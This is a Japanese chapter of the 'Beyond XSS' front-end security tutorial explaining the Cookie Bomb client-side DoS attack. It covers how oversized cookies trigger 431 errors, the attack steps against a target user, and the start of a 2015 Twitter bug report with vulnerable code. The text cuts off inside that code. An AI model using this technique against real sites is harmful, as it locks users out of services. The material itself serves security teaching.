<!doctype html>
<html lang="ja" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-ch4/cookie-bomb" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.3">
<title data-rh="true">面白くて実用的なCookie Bomb | Beyond XSS</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://aszx87410.github.io/beyond-xss/ja/img/cover.png"><meta data-rh="true" name="twitter:image" content="https://aszx87410.github.io/beyond-xss/ja/img/cover.png"><meta data-rh="true" property="og:url" content="https://aszx87410.github.io/beyond-xss/ja/ch4/cookie-bomb/"><meta data-rh="true" name="docusaurus_locale" content="ja"><meta data-rh="true" name="docsearch:language" content="ja"><meta data-rh="true" name="google-site-verification" content="O7SjDEO9AQXbxqBWhtUW0FVahHxSrnweMXJxLICpSz4"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="面白くて実用的なCookie Bomb | Beyond XSS"><meta data-rh="true" name="description" content="前回の投稿では、Cookieを書き込むことで他のSame-siteドメインに影響を与えることができるCookie Tossingについて学びました。今回の投稿では、Cookieを利用した別の攻撃手法であるCookie Bombを紹介します。これはCookieによって引き起こされるクライアントサイドのDoS攻撃です。"><meta data-rh="true" property="og:description" content="前回の投稿では、Cookieを書き込むことで他のSame-siteドメインに影響を与えることができるCookie Tossingについて学びました。今回の投稿では、Cookieを利用した別の攻撃手法であるCookie Bombを紹介します。これはCookieによって引き起こされるクライアントサイドのDoS攻撃です。"><link data-rh="true" rel="icon" href="/beyond-xss/ja/img/logo.png"><link data-rh="true" rel="canonical" href="https://aszx87410.github.io/beyond-xss/ja/ch4/cookie-bomb/"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/en/ch4/cookie-bomb/" hreflang="en"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="zh-TW"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ja/ch4/cookie-bomb/" hreflang="ja"><link data-rh="true" rel="alternate" href="https://aszx87410.github.io/beyond-xss/ch4/cookie-bomb/" hreflang="x-default"><link rel="stylesheet" href="/beyond-xss/ja/assets/css/styles.32fcb3bb.css">
<link rel="preload" href="/beyond-xss/ja/assets/js/runtime~main.531fd90e.js" as="script">
<link rel="preload" href="/beyond-xss/ja/assets/js/main.b4cb8381.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="メインコンテンツまでスキップ"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">メインコンテンツまでスキップ</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/beyond-xss/ja/"><div class="navbar__logo"><img src="/beyond-xss/ja/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/beyond-xss/ja/img/logo.png" alt="logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Beyond XSS：Webフロントエンドセキュリティの世界を探る</b></a></div><div class="navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link"><svg viewBox="0 0 24 24" width="20" height="20" aria-hidden="true" class="iconLanguage_nlXk"><path fill="currentColor" d="M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"></path></svg>日本語</a><ul class="dropdown__menu"><li><a href="/beyond-xss/en/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="en">English</a></li><li><a href="/beyond-xss/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link" lang="zh-TW">中文（台灣）</a></li><li><a href="/beyond-xss/ja/ch4/cookie-bomb/" target="_self" rel="noopener noreferrer" class="dropdown__link dropdown__link--active" lang="ja">日本語</a></li></ul></div><a href="https://github.com/aszx87410/beyond-xss" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="ダークモードを切り替える(現在はライトモード)" aria-label="ダークモードを切り替える(現在はライトモード)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="先頭へ戻る" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/ja/">このシリーズについて</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">第一章：XSSから見たフロントエンド・セキュリティ</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch1/browser-security-model/">ブラウザのセキュリティモデル</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch1/xss-introduction/">XSSから始めるフロントエンドのセキュリティ</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch1/know-xss-a-bit-more/">XSSについてもう少し詳しく</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch1/javascript-protocol/">危険な javascript: 疑似スキーム</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">第二章：XSSの防御と回避</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/xss-defense-sanitization/">XSSの第一の防御線：サニタイズ</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/xss-defense-csp/">XSSの第二の防御線：CSP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/token-storage/">XSSの第三の防御線：影響範囲の縮小</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/trust-types/">最新のXSS防御：Trusted Typesと組み込みSanitizer API</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/csp-bypass/">防御の回避：一般的なCSPバイパス</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/mutation-xss/">防御の回避：Mutation XSS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch2/universal-xss/">最強のXSS：Universal XSS</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">第三章：JavaScriptを使わない攻撃</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/attack-without-js/">攻撃にJavaScriptを直接実行する必要があるなんて誰が言った？</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/prototype-pollution/">プロトタイプチェーンを悪用した攻撃：Prototype Pollution</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/dom-clobbering/">HTMLもJavaScriptに影響を与える？DOM clobbering入門</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/csti/">フロントエンドのテンプレートインジェクション攻撃：CSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/css-injection/">CSSだけで攻撃できる？CSSインジェクション（前編）</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/css-injection-2/">CSSだけで攻撃できる？CSSインジェクション（後編）</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch3/html-attack/">HTMLだけで攻撃できる？</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--active">第四章：クロスサイト攻撃</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/sop-and-site/">最重要：同一オリジンポリシーとサイト</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/cors-intro/">クロスオリジンリソース共有 CORS 基本紹介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/cors-attack/">クロスオリジンセキュリティの問題</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/csrf/">クロスサイトリクエストフォージェリ（CSRF）を簡単に理解する</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/same-site-cookie/">Same-site Cookie、CSRFの救世主？</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch4/subdomain/">Same-Siteからメインサイトへ</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/beyond-xss/ja/ch4/cookie-bomb/">面白くて実用的なCookie Bomb</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link">第五章：その他の興味深いフロントエンド・セキュリティのトピック</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/clickjacking/">あなたの画面はあなたの画面ではない：クリックジャッキング</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/mime-sniffing/">MIMEスニッフィングを利用した攻撃</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/supply-chain-attack/">フロントエンドサプライチェーン攻撃：上流から下流への攻撃</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/web3-attacks/">Web3におけるウェブフロントエンド攻撃の応用</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/xsleaks-1/">最も興味深いフロントエンドサイドチャネル攻撃：XSLeaks（パート1）</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/beyond-xss/ja/ch5/xsleaks-2/">最も興味深いフロントエンドサイドチャネル攻撃：XSLeaks（パート2）</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/ja/summary/">まとめ</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/beyond-xss/ja/contact/">著者への連絡</a></li></ul></nav></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="パンくずリストのナビゲーション"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="ホームページ" class="breadcrumbs__link" href="/beyond-xss/ja/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">第四章：クロスサイト攻撃</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">面白くて実用的なCookie Bomb</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">このページの見出し</button></div><div class="theme-doc-markdown markdown"><h1>面白くて実用的なCookie Bomb</h1><p>前回の投稿では、Cookieを書き込むことで他のSame-siteドメインに影響を与えることができるCookie Tossingについて学びました。今回の投稿では、Cookieを利用した別の攻撃手法であるCookie Bombを紹介します。これはCookieによって引き起こされるクライアントサイドのDoS攻撃です。</p><p>DoSというと、ウェブサイトに大量のパケットを送信し、サーバーを応答不能にしたりリソースを枯渇させたりすることを思い浮かべるかもしれません。また、DDoS（分散型サービス妨害）を思い浮かべるかもしれません。これは、1台のホストではなく、多数のホストが同時に特定のサーバーにパケットを送信し、それをクラッシュさせるものです。</p><p>DoS攻撃とDDoS攻撃は実際には異なるレイヤーで動作します。これらのレイヤーは、皆さんが学んだことのあるOSIモデルに対応しています。私たちが通常考える攻撃は、L3ネットワーク層とL4トランスポート層の攻撃に近いものです。しかし、Cookie BombはL7アプリケーション層に存在するDoS攻撃です。</p><p>例えば、あるウェブサイトにデータを照会するためのAPIがあり、デフォルトの制限が100に設定されているとします。しかし、それを10000に変更すると、サーバーが応答するのに1分以上かかることに気づきました。そこで、2秒ごとにリクエストを送信し始めました。これらのリクエストを送信し続けると、ウェブサイトが遅くなり、最終的にはクラッシュし、500 Internal Server Errorしか返さなくなることがわかります。これは、アプリケーション層でのDoS攻撃の例です。</p><p>ユーザーがウェブサイトにアクセスできないようにする方法は、DoS攻撃と見なすことができます。私たちが発見した方法はL7アプリケーション層に基づいているため、L7 DoS攻撃となります。</p><p>さまざまなL7 DoS攻撃手法の中で、特に興味深いと思うのがCookie Bombです。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-bombの紹介">Cookie Bombの紹介<a href="#cookie-bombの紹介" class="hash-link" aria-label="Cookie Bombの紹介 への直接リンク" title="Cookie Bombの紹介 への直接リンク">​</a></h2><p>Cookie Bomb攻撃を実行するための前提条件は、Cookieを書き込めることです。これを達成するには基本的に2つの方法があります。最初の方法は、ウェブサイト自体のロジックを利用することです。</p><p>例えば、<code>https://example.com/log?uid=abc</code>というページがあるとします。このページにアクセスすると、<code>uid=abc</code>がCookieに書き込まれます。したがって、URLを<code>?uid=xxxxxxxxxx</code>に変更すると、<code>xxxxxxxxxx</code>がCookieに書き込まれます。これが1つの方法です。</p><p>もう1つの方法は、前回の投稿で述べたもので、サブドメインを制御し、JavaScriptコードを実行できることです。これは、サブドメイン乗っ取りやその他の方法で達成できます。</p><p>任意のCookieを書き込めるようになったら、それで何ができるでしょうか？たくさんのゴミを書き込み始めることができます。</p><p>例えば、<code>a1=o....*4000</code>のように、Cookieにたくさんの無意味な内容を書き込みます。ここで重要なのは、1つのCookieのサイズは約4KBであり、攻撃を達成するには少なくとも2つのCookie、つまり8KBのデータを書き込む必要があるということです。</p><p>これらのCookieを書き込んだ後、ホームページ<code>https://example.com</code>に戻ると、Cookieの性質上、これらのゴミCookieはすべてサーバーに送信されますよね？さあ、奇跡の瞬間です。</p><p>通常のページを表示する代わりに、サーバーはエラーを返します：<code>431 Request Header Fields Too Large</code>。</p><p><img loading="lazy" src="/beyond-xss/ja/assets/images/26-01-9e9e072354b015f68c2f47b0a79cdbbc.png" width="1557" height="797" class="img_ev3q"></p><p>さまざまなHTTPステータスコードの中に、リクエストが大きすぎることに関連するものが2つあります。</p><ol><li>413 Payload Too Large</li><li>431 Request Header Fields Too Large</li></ol><p>例えば、100万文字のフォームに入力してサーバーに送信すると、<code>413 Payload Too Large</code>というレスポンスを受け取る可能性が高くなります。エラーメッセージが示すように、ペイロードが大きすぎてサーバーが処理できません。</p><p>ヘッダーも同様です。Cookieが多すぎると、リクエストヘッダーの<code>Cookie</code>フィールドが大きくなり、サーバーが処理できないほど大きくなり、<code>431 Request Header Fields Too Large</code>というレスポンスが返されます（ただし、テストに基づくと、一部のサーバーは実装によって異なるコードで応答する可能性があり、例えばMicrosoftは400 bad requestで応答します）。</p><p>したがって、ユーザーのCookieを過負荷にできれば、このエラーページを表示させ、サービスに正常にアクセスできないようにすることができます。これがCookie Bombであり、多数のCookieによって引き起こされるDoS攻撃です。その根本的な原理は、「ブラウザがウェブページにアクセスする際、対応するCookieを自動的に一緒に送信する」ということです。</p><p>「Cookie Bomb」という用語は、2014年1月18日にEgor Homakov氏が公開したブログ投稿「<a href="http://homakov.blogspot.com/2014/01/cookie-bomb-or-lets-break-internet.html" target="_blank" rel="noopener noreferrer">Cookie Bomb or let&#x27;s break the Internet.</a>」に由来すると思われます。しかし、同様の攻撃手法は2009年には既に登場していました：<a href="http://sirdarckcat.blogspot.com/2009/04/how-to-use-google-analytics-to-dos.html" target="_blank" rel="noopener noreferrer">How to use Google Analytics to DoS a client from some website</a>。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="攻撃プロセス">攻撃プロセス<a href="#攻撃プロセス" class="hash-link" aria-label="攻撃プロセス への直接リンク" title="攻撃プロセス への直接リンク">​</a></h2><p>上記で述べたように、任意のCookieを設定できるURL <code>https://example.com/log?uid=abc</code>を発見したとします。次の手順は以下の通りです。</p><ol><li>8KBを超えるCookieを書き込む方法を見つける（多くのサーバーの制限が約8KBであるため）。</li><li>このURLを攻撃対象に渡し、クリックさせる方法を見つける。</li><li>ターゲットがURLをクリックし、ブラウザに非常に大きなCookieを設定する。</li><li>ターゲットがウェブサイト<code>https://example.com</code>にアクセスすると、コンテンツが表示されず、空白ページまたはエラーメッセージのみが表示される。攻撃は成功。</li></ol><p>この状況では、ユーザーがブラウザを変更するか、Cookieの有効期限が切れるか、手動でCookieをクリアしない限り、常にこの状態になります。</p><p>まとめると、この攻撃は特定のユーザーのみを標的にでき、2つの前提条件が必要です。</p><ol><li>任意のCookieを設定できる場所を見つける。</li><li>ターゲットがステップ1で見つかったURLをクリックする必要がある。</li></ol><p>次に、いくつかの実際の例を見てみましょう。最初の例は、2015年にfiledescriptor氏がTwitterに報告した脆弱性です：<a href="https://hackerone.com/reports/57356" target="_blank" rel="noopener noreferrer">DOM based cookie bomb</a>。</p><p>彼はTwitterのウェブサイトで次のコードを見つけました。</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">referrer</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">||</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;none&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            d </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;ev_redir_&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">encodeURIComponent</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;=&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> b </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;; path=/&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">d</span><span class="token punctuation" style="color:#393A34">(</span><span class="token dom variable" style="color:#36acaa">window</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">location</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">hash</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">substr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toLowerCase</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 